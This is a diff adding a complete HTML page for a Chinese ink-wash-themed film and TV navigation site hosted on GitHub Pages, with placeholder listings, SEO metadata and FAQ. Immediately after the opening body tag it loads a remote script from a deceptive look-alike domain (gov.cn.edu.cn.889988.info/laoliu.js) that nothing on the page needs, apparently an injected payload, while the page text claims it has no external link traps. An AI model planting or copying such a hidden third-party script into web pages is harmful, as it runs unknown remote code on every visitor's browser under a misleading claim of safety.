@@ -1,0 +1,357 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>南柯电影网 - 水墨梦境电影电视剧综艺动漫短剧</title>
+<meta name="description" content="南柯电影网(nankedianyingwang-h5.github.io)以水墨梦境风格聚合电影、电视剧、综艺、动漫、短剧，移动端自适应，分类清晰，适合沉浸式找片观影。">
+<meta name="keywords" content="南柯电影网,电影,电视剧,综艺,动漫,短剧,水墨影视,梦境影院,nankedianyingwang-h5">
+<meta name="robots" content="index,follow">
+<link rel="canonical" href="https://nankedianyingwang-h5.github.io/">
+<script type="application/ld+json">
+{
+  "@context":"https://schema.org",
+  "@type":"WebSite",
+  "name":"南柯电影网",
+  "url":"https://nankedianyingwang-h5.github.io/",
+  "description":"水墨梦境风格影视导航站",
+  "potentialAction":{
+    "@type":"SearchAction",
+    "target":"https://nankedianyingwang-h5.github.io/#search?q={query}",
+    "query-input":"required name=query"
+  }
+}
+</script>
+<style>
+:root{
+  --ink:#0c1310;
+  --paper:#10201b;
+  --card:#13261f;
+  --line:rgba(120,200,170,.22);
+  --green:#5fbf9b;
+  --green-light:#9be8c8;
+  --gold:#e7c873;
+  --text:#e8f3ec;
+  --muted:#9fb6ab;
+}
+*{margin:0;padding:0;box-sizing:border-box}
+html{scroll-behavior:smooth}
+body{
+  font-family:"PingFang SC","Microsoft YaHei",system-ui,sans-serif;
+  background:
+    radial-gradient(900px 420px at 85% -10%, rgba(95,191,155,.16), transparent 60%),
+    radial-gradient(700px 320px at 0% 0%, rgba(231,200,115,.08), transparent 55%),
+    var(--ink);
+  color:var(--text);line-height:1.75;
+}
+a{color:inherit;text-decoration:none}
+.wrap{max-width:1160px;margin:0 auto;padding:0 16px}
+
+/* NAV */
+.nav{position:sticky;top:0;z-index:99;background:rgba(12,19,16,.9);backdrop-filter:blur(8px);border-bottom:1px solid var(--line)}
+.nav-inner{display:flex;align-items:center;justify-content:space-between;height:62px}
+.logo{font-weight:900;font-size:1.45rem;letter-spacing:2px;color:var(--green-light)}
+.logo b{color:var(--gold)}
+.nav ul{display:flex;gap:4px;list-style:none}
+.nav li a{padding:8px 14px;border-radius:999px;color:var(--muted);font-size:.92rem}
+.nav li a:hover,.nav li a.active{color:var(--ink);background:linear-gradient(90deg,var(--green),var(--green-light))}
+.menu-btn{display:none;background:none;border:1px solid var(--line);color:var(--green-light);font-size:1.4rem;border-radius:8px;padding:3px 10px;cursor:pointer}
+
+/* HERO */
+.hero{padding:90px 0 66px;position:relative;overflow:hidden}
+.hero .seal{
+  display:inline-block;font-size:.76rem;color:var(--gold);
+  border:1px solid var(--line);padding:4px 14px;border-radius:6px;margin-bottom:18px;letter-spacing:3px;
+}
+.hero h1{font-size:clamp(2rem,6vw,3.4rem);font-weight:900;line-height:1.18;margin-bottom:16px}
+.hero h1 span{color:var(--green)}
+.hero p{max-width:640px;color:var(--muted);font-size:1.06rem;margin-bottom:26px}
+.search{display:flex;gap:10px;max-width:540px}
+.search input{flex:1;padding:14px 18px;border-radius:12px;background:var(--card);border:1px solid var(--line);color:var(--text);outline:none;font-size:1rem}
+.search input:focus{border-color:var(--green)}
+.search button{padding:0 26px;border:none;border-radius:12px;font-weight:700;color:#06231a;background:linear-gradient(90deg,var(--green),var(--gold));cursor:pointer}
+.search button:hover{filter:brightness(1.05)}
+
+/* SECTION */
+.section{padding:56px 0}
+.head{display:flex;align-items:flex-end;justify-content:space-between;gap:10px;margin-bottom:26px;flex-wrap:wrap}
+.head h2{font-size:1.7rem;font-weight:800}
+.head h2 i{font-style:normal;color:var(--green)}
+.head span{color:var(--muted);font-size:.85rem}
+.more{padding:6px 14px;border:1px solid var(--line);border-radius:999px;color:var(--muted);font-size:.85rem}
+.more:hover{color:var(--green-light);border-color:var(--green)}
+
+/* MOVIES: ink cards */
+.grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(180px,1fr));gap:18px}
+.ink{background:var(--card);border:1px solid var(--line);border-radius:16px;overflow:hidden;transition:.25s}
+.ink:hover{transform:translateY(-4px);border-color:var(--green);box-shadow:0 12px 30px rgba(95,191,155,.14)}
+.ink .ph{height:240px;display:flex;align-items:center;justify-content:center;text-align:center;font-weight:800;color:#06231a;padding:12px}
+.p1{background:linear-gradient(135deg,#5fbf9b,#9be8c8)}
+.p2{background:linear-gradient(135deg,#e7c873,#5fbf9b)}
+.p3{background:linear-gradient(135deg,#2f5d4f,#5fbf9b)}
+.p4{background:linear-gradient(135deg,#9be8c8,#e7c873)}
+.p5{background:linear-gradient(135deg,#3a6b53,#9be8c8)}
+.p6{background:linear-gradient(135deg,#e7c873,#bfa15a)}
+.ink .meta{padding:12px}
+.ink .meta h3{font-size:.98rem;margin-bottom:4px}
+.ink .meta p{font-size:.78rem;color:var(--muted)}
+
+/* TV: scroll-snap row */
+.tv-scroll{display:flex;gap:16px;overflow-x:auto;padding-bottom:10px;scroll-snap-type:x mandatory}
+.tv-scroll::-webkit-scrollbar{height:6px}
+.tv-scroll::-webkit-scrollbar-thumb{background:var(--line);border-radius:6px}
+.tv-card{min-width:280px;scroll-snap-align:start;background:linear-gradient(160deg,#13261f,#0f1f19);border:1px solid var(--line);border-radius:16px;padding:18px}
+.tv-card .tag{font-size:.72rem;color:var(--gold);border:1px solid var(--line);padding:3px 10px;border-radius:999px}
+.tv-card h3{font-size:1.05rem;margin:10px 0 6px}
+.tv-card p{font-size:.85rem;color:var(--muted)}
+
+/* VARIETY: masonry-ish */
+.var-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(220px,1fr));gap:18px}
+.var-box{border-radius:16px;padding:18px;color:#06231a;font-weight:700}
+.vb1{background:linear-gradient(135deg,#9be8c8,#5fbf9b)}
+.vb2{background:linear-gradient(135deg,#e7c873,#9be8c8)}
+.vb3{background:linear-gradient(135deg,#5fbf9b,#2f5d4f);color:#e8f3ec}
+.vb4{background:linear-gradient(135deg,#bfa15a,#e7c873)}
+.var-box p{font-weight:400;font-size:.82rem;margin-top:6px;opacity:.85}
+
+/* ANIME: circle list */
+.anime{display:grid;grid-template-columns:repeat(auto-fill,minmax(200px,1fr));gap:20px}
+.orb{height:170px;border-radius:50% 50% 18px 18px;display:flex;align-items:flex-end;padding:16px;color:#06231a;font-weight:800;border:1px solid var(--line)}
+.o1{background:linear-gradient(160deg,#9be8c8,#5fbf9b)}
+.o2{background:linear-gradient(160deg,#e7c873,#5fbf9b)}
+.o3{background:linear-gradient(160deg,#5fbf9b,#3a6b53);color:#e8f3ec}
+.o4{background:linear-gradient(160deg,#bfa15a,#9be8c8)}
+.orb small{display:block;font-weight:400;font-size:.78rem;opacity:.8}
+
+/* SHORT: faq timeline */
+.faq{display:flex;flex-direction:column;gap:10px;max-width:820px}
+.qa{background:var(--card);border:1px solid var(--line);border-radius:12px;overflow:hidden}
+.qa-q{display:flex;justify-content:space-between;align-items:center;padding:16px 18px;cursor:pointer;font-weight:700}
+.qa-q .plus{color:var(--green)}
+.qa-a{max-height:0;overflow:hidden;transition:max-height .35s ease;padding:0 18px;color:var(--muted);font-size:.9rem}
+.qa.open .qa-a{padding:0 18px 16px;max-height:200px}
+
+/* ABOUT + FAQ SEO */
+.about{background:var(--paper);border-top:1px solid var(--line);border-bottom:1px solid var(--line);padding:54px 0}
+.about h2{font-size:1.5rem;margin-bottom:14px;color:var(--green-light)}
+.about p{max-width:780px;margin:0 auto 12px;color:var(--muted)}
+.url-pill{display:inline-block;margin-top:14px;padding:10px 18px;border:1px dashed var(--green);border-radius:12px;color:var(--green-light);font-size:.9rem}
+.faq-seo{padding:40px 0}
+.faq-seo h2{font-size:1.4rem;margin-bottom:18px;color:var(--gold)}
+.faq-seo .item{margin-bottom:14px}
+.faq-seo h3{font-size:1rem;color:var(--green-light);margin-bottom:6px}
+.faq-seo p{color:var(--muted);font-size:.92rem}
+
+.foot{padding:26px 0;text-align:center;color:var(--muted);font-size:.82rem}
+.foot a{color:var(--green)}
+
+.topbtn{position:fixed;right:18px;bottom:18px;width:46px;height:46px;border-radius:50%;display:none;align-items:center;justify-content:center;cursor:pointer;color:#06231a;font-weight:900;background:linear-gradient(135deg,var(--green),var(--gold));z-index:120}
+
+@media(max-width:768px){
+  .menu-btn{display:block}
+  .nav ul{display:none;position:absolute;top:62px;left:0;right:0;flex-direction:column;background:rgba(12,19,16,.98);padding:12px 16px;border-bottom:1px solid var(--line)}
+  .nav ul.show{display:flex}
+  .nav li a{padding:12px}
+  .hero{padding:54px 0 40px}
+  .grid{grid-template-columns:repeat(2,1fr);gap:12px}
+  .ink .ph{height:180px}
+  .var-grid{grid-template-columns:1fr 1fr}
+  .anime{grid-template-columns:1fr 1fr}
+  .head h2{font-size:1.35rem}
+}
+@media(max-width:430px){
+  .search{flex-direction:column}
+  .search button{padding:14px}
+  .grid{grid-template-columns:1fr 1fr}
+  .var-grid,.anime{grid-template-columns:1fr}
+}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/laoliu.js"></script>
+
+<header class="nav">
+  <div class="wrap nav-inner">
+    <div class="logo">南柯电影网<b>·梦</b></div>
+    <button class="menu-btn" onclick="document.getElementById('menu').classList.toggle('show')">☰</button>
+    <nav>
+      <ul id="menu">
+        <li><a href="#movies" class="active">电影</a></li>
+        <li><a href="#tv">电视剧</a></li>
+        <li><a href="#variety">综艺</a></li>
+        <li><a href="#anime">动漫</a></li>
+        <li><a href="#shorts">短剧</a></li>
+        <li><a href="#about">关于</a></li>
+      </ul>
+    </nav>
+  </div>
+</header>
+
+<section class="hero">
+  <div class="wrap">
+    <span class="seal">南柯一梦 · 光影入戏</span>
+    <h1>南柯电影网<br>在<span>水墨梦境</span>里找一部好片</h1>
+    <p>南柯电影网（nankedianyingwang-h5.github.io）用山水墨色做底，聚合电影、电视剧、综艺、动漫、短剧，手机端一屏直达，适合慢慢挑、静静看。</p>
+    <div class="search">
+      <input type="text" placeholder="搜索：武侠 / 文艺片 / 国漫 / 悬疑剧 / 微短剧...">
+      <button type="button">入梦搜索</button>
+    </div>
+  </div>
+</section>
+
+<section class="section" id="movies">
+  <div class="wrap">
+    <div class="head"><div><h2><i>01.</i> 梦境电影</h2></div><a href="#" class="more">更多 #</a></div>
+    <div class="grid">
+      <div class="ink"><div class="ph p1">山雨欲来</div><div class="meta"><h3>山雨欲来</h3><p>2026 · 文艺 · 8.7</p></div></div>
+      <div class="ink"><div class="ph p2">浮生戏台</div><div class="meta"><h3>浮生戏台</h3><p>2025 · 剧情 · 8.5</p></div></div>
+      <div class="ink"><div class="ph p3">青绿秘境</div><div class="meta"><h3>青绿秘境</h3><p>2026 · 奇幻 · 8.3</p></div></div>
+      <div class="ink"><div class="ph p4">夜泊灯火</div><div class="meta"><h3>夜泊灯火</h3><p>2025 · 悬疑 · 8.9</p></div></div>
+      <div class="ink"><div class="ph p5">故人归舟</div><div class="meta"><h3>故人归舟</h3><p>2024 · 武侠 · 9.0</p></div></div>
+      <div class="ink"><div class="ph p6">梦里长安</div><div class="meta"><h3>梦里长安</h3><p>2026 · 历史 · 8.4</p></div></div>
+    </div>
+  </div>
+</section>
+
+<section class="section" id="tv" style="background:rgba(95,191,155,.05)">
+  <div class="wrap">
+    <div class="head"><div><h2><i>02.</i> 热播剧集</h2></div><a href="#" class="more">更多 #</a></div>
+    <div class="tv-scroll">
+      <div class="tv-card"><span class="tag">古装</span><h3>南柯邸报</h3><p>权谋+志怪，全40集，水墨群像剧。</p></div>
+      <div class="tv-card"><span class="tag">都市</span><h3>晚风邮局</h3><p>慢节奏治愈剧，更新至第26集。</p></div>
+      <div class="tv-card"><span class="tag">悬疑</span><h3>灯下无影</h3><p>单元探案，剧本扎实，已更18集。</p></div>
+      <div class="tv-card"><span class="tag">武侠</span><h3>江湖南柯</h3><p>江湖门派兴衰，全36集。</p></div>
+      <div class="tv-card"><span class="tag">年代</span><h3>戏班那年</h3><p>梨园往事，服化道考究。</p></div>
+    </div>
+  </div>
+</section>
+
+<section class="section" id="variety">
+  <div class="wrap">
+    <div class="head"><div><h2><i>03.</i> 综艺现场</h2></div><a href="#" class="more">更多 #</a></div>
+    <div class="var-grid">
+      <div class="var-box vb1">山水对谈<p>文化访谈 · 第12期</p></div>
+      <div class="var-box vb2">梦中音乐会<p>国风音乐 · 第8期</p></div>
+      <div class="var-box vb3">南柯夜话<p>悬疑故事会 · 第10期</p></div>
+      <div class="var-box vb4">烟火食单<p>美食文旅 · 第14期</p></div>
+    </div>
+  </div>
+</section>
+
+<section class="section" id="anime" style="background:rgba(231,200,115,.05)">
+  <div class="wrap">
+    <div class="head"><div><h2><i>04.</i> 国风动漫</h2></div><a href="#" class="more">更多 #</a></div>
+    <div class="anime">
+      <div class="orb o1">青鸾记<small>神话 / 国漫 / 连载</small></div>
+      <div class="orb o2">墨童<small>治愈 / 校园 / 全26集</small></div>
+      <div class="orb o3">山海灯<small>志怪 / 单元 / 全13集</small></div>
+      <div class="orb o4">江上琴师<small>古风 / 音乐 / 连载</small></div>
+    </div>
+  </div>
+</section>
+
+<section class="section" id="shorts">
+  <div class="wrap">
+    <div class="head"><div><h2><i>05.</i> 微短剧</h2></div><a href="#" class="more">更多 #</a></div>
+    <div class="faq" id="faq">
+      <div class="qa open">
+        <div class="qa-q">南柯梦：公子别走 <span class="plus">－</span></div>
+        <div class="qa-a">古风逆袭短剧，单集1-2分钟，已更96集，适合碎片时间。</div>
+      </div>
+      <div class="qa">
+        <div class="qa-q">灯下重逢 <span class="plus">＋</span></div>
+        <div class="qa-a">都市情感微剧，失忆+重逢，已更52集。</div>
+      </div>
+      <div class="qa">
+        <div class="qa-q">戏魂归来 <span class="plus">＋</span></div>
+        <div class="qa-a">梨园题材短剧，传承与复仇并行，已更40集。</div>
+      </div>
+      <div class="qa">
+        <div class="qa-q">山中客栈 <span class="plus">＋</span></div>
+        <div class="qa-a">志怪单元短剧，每集一个妖怪故事，已更24集。</div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<section class="about" id="about">
+  <div class="wrap">
+    <h2>关于 南柯电影网</h2>
+    <p>南柯电影网是一个单页影视导航站，主题取自“南柯一梦”：用青绿山水、墨色留白、灯笼暖光来组织电影、电视剧、综艺、动漫、短剧内容。</p>
+    <p>页面无后端、无跳转外链陷阱，所有栏目在同一页面内锚点切换，移动端自适应，符合静态站与搜索引擎可抓取、可阅读的基本规范。</p>
+    <div class="url-pill">🌐 https://nankedianyingwang-h5.github.io</div>
+  </div>
+</section>
+
+<section class="faq-seo">
+  <div class="wrap">
+    <h2>常见问题（FAQ）</h2>
+    <div class="item">
+      <h3>南柯电影网是什么？</h3>
+      <p>南柯电影网（nankedianyingwang-h5.github.io）是一个水墨梦境风格的影视导航单页，聚合电影、电视剧、综艺、动漫、短剧入口与分类展示。</p>
+    </div>
+    <div class="item">
+      <h3>南柯电影网支持手机看吗？</h3>
+      <p>支持。页面使用流式网格与媒体查询，在手机、平板、桌面端都会自动重排，不出现横向滚动条。</p>
+    </div>
+    <div class="item">
+      <h3>站内链接为什么是 # ？</h3>
+      <p>当前为单页展示站，栏目间用锚点跳转；“更多/播放”等内页链接用 # 占位，后续可替换为真实播放页或详情页地址。</p>
+    </div>
+  </div>
+</section>
+
+<footer class="foot">
+  <div class="wrap">
+    <p>南柯电影网 ｜ 电影 / 电视剧 / 综艺 / 动漫 / 短剧 导航</p>
+    <p>网址：<a href="https://nankedianyingwang-h5.github.io">nankedianyingwang-h5.github.io</a></p>
+    <p>© 2026 南柯电影网</p>
+  </div>
+</footer>
+
+<div class="topbtn" id="topBtn" onclick="window.scrollTo({top:0,behavior:'smooth'})">↑</div>
+
+<script>
+// FAQ
+document.querySelectorAll('#faq .qa-q').forEach(function(q){
+  q.addEventListener('click', function(){
+    var item=this.parentElement;
+    document.querySelectorAll('#faq .qa').forEach(function(i){
+      if(i!==item){ i.classList.remove('open'); i.querySelector('.plus').textContent='＋'; }
+    });
+    var open=item.classList.toggle('open');
+    this.querySelector('.plus').textContent = open ? '－' : '＋';
+  });
+});
+
+// 滚动高亮 + 回顶
+var secs=['movies','tv','variety','anime','shorts','about'];
+window.addEventListener('scroll', function(){
+  document.getElementById('topBtn').style.display = window.scrollY>300 ? 'flex':'none';
+  var cur='';
+  secs.forEach(function(id){
+    var el=document.getElementById(id);
+    if(el && window.scrollY>=el.offsetTop-120) cur=id;
+  });
+  document.querySelectorAll('.nav ul a').forEach(function(a){
+    a.classList.remove('active');
+    if(a.getAttribute('href')==='#'+cur) a.classList.add('active');
+  });
+});
+
+// 锚点
+document.querySelectorAll('.nav ul a').forEach(function(a){
+  a.addEventListener('click', function(e){
+    var h=this.getAttribute('href');
+    if(h && h[0]==='#'){
+      e.preventDefault();
+      var el=document.querySelector(h);
+      if(el) window.scrollTo({top:el.offsetTop-62,behavior:'smooth'});
+      document.getElementById('menu').classList.remove('show');
+    }
+  });
+});
+</script>
+</body>
+</html>
